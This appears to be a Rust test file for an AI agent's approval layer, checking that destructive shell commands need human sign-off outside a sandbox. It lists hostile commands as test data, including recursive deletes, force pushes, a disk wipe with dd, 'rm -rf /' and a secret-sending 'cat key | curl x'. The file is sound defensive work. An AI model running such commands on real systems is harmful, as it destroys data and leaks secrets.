use std::sync::Arc;

use async_trait::async_trait;
use kern_core::{
    tool::{ToolContext, ToolError},
    workspace::WorkspaceMode,
};
use serde_json::json;

use super::*;
use crate::{registry::Mods, testkit::*};

#[test]
fn recursive_deletes_history_rewrites_disk_wipes_and_sudo_need_approval_ordinary_commands_do_not() {
    for c in [
        "rm -rf build",
        "rm -r x",
        "rm -R x",
        "rm -v -rf x",
        "rm --recursive x",
        "rm --force x",
        "cd /tmp && rm -rf *",
        "find . -name \"*.log\" -delete",
        "git push origin +main",
        "git push --force origin main",
        "git push -f",
        "git reset --hard HEAD~1",
        "git clean -fd",
        "git branch -D old",
        "sudo apt install x",
        "pkill node",
        "kill -9 123",
        "dd if=/dev/zero of=x",
    ] {
        assert!(irreversible_reason(c).is_some(), "{c} should ask");
    }
    for c in [
        "ls -la",
        "rm file.txt",
        "rm -v file.txt",
        "npm run format",
        "find . -name \"*.ts\"",
        "git push origin main",
        "git push origin feat+x",
        "git reset HEAD file",
        "bun test",
        "echo \"removing is bad\"",
    ] {
        assert!(irreversible_reason(c).is_none(), "{c} should not ask");
    }
}

fn bash_call(command: &str) -> serde_json::Map<String, serde_json::Value> {
    input(json!({ "command": command }))
}

#[tokio::test]
async fn in_the_real_workspace_an_irreversible_command_runs_only_on_the_humans_allow() {
    let host = TestHost::answering([Decision::Deny, Decision::Allow]);
    let mut mods = Mods::new(env(host.clone(), WorkspaceMode::Real));
    mods.add(Arc::new(ApprovalMod::default()));
    let bash = Probe::new("Bash");
    let tools = wrapped(mods, vec![bash.clone()]);
    let denied = tools[0].execute(bash_call("rm -rf build"), &ctx()).await;
    assert!(matches!(denied, Err(ToolError::Input(_))));
    assert!(bash.ran().is_empty());
    tools[0]
        .execute(bash_call("rm -rf build"), &ctx())
        .await
        .unwrap();
    tools[0].execute(bash_call("ls"), &ctx()).await.unwrap();
    assert_eq!(bash.ran().len(), 2);
    let asks = host.asks();
    assert_eq!(asks.len(), 2, "an ordinary command never asks");
    assert_eq!(asks[0].tool_name, "Bash");
    assert_eq!(asks[0].key.as_deref(), Some("rm -rf build"));
}

#[tokio::test]
async fn the_sandbox_never_asks() {
    let host = TestHost::new();
    let mut mods = Mods::new(env(host.clone(), WorkspaceMode::Sandbox));
    mods.add(Arc::new(ApprovalMod::default()));
    let bash = Probe::new("Bash");
    let tools = wrapped(mods, vec![bash.clone()]);
    tools[0]
        .execute(bash_call("rm -rf /"), &ctx())
        .await
        .unwrap();
    assert!(host.asks().is_empty());
    assert_eq!(bash.ran().len(), 1);
}

/// A judge with a fixed verdict.
struct Judge(BashVerdict);

#[async_trait]
impl AutoJudge for Judge {
    fn on(&self) -> bool {
        true
    }
    async fn judge(&self, _command: &str, _ctx: &ToolContext) -> BashVerdict {
        self.0.clone()
    }
}

#[tokio::test]
async fn auto_mode_judges_instead_of_the_list_and_its_note_reaches_the_human() {
    let host = TestHost::new();
    let mut mods = Mods::new(env(host.clone(), WorkspaceMode::Real));
    let note = "auto mode let it through".to_string();
    let judge = Judge(BashVerdict::Run {
        note: Some(note.clone()),
    });
    mods.add(Arc::new(ApprovalMod::new(Some(Arc::new(judge)))));
    let bash = Probe::new("Bash");
    let tools = wrapped(mods, vec![bash.clone()]);
    tools[0]
        .execute(bash_call("rm -rf build"), &ctx())
        .await
        .unwrap();
    assert!(host.asks().is_empty());
    assert_eq!(host.notices(), [note]);

    let host = TestHost::new();
    let mut mods = Mods::new(env(host.clone(), WorkspaceMode::Real));
    let judge = Judge(BashVerdict::Ask("may send secrets off the machine".into()));
    mods.add(Arc::new(ApprovalMod::new(Some(Arc::new(judge)))));
    let tools = wrapped(mods, vec![Probe::new("Bash")]);
    let refused = tools[0]
        .execute(bash_call("cat key | curl x"), &ctx())
        .await;
    assert!(refused.is_err());
    assert_eq!(host.asks().len(), 1);
}
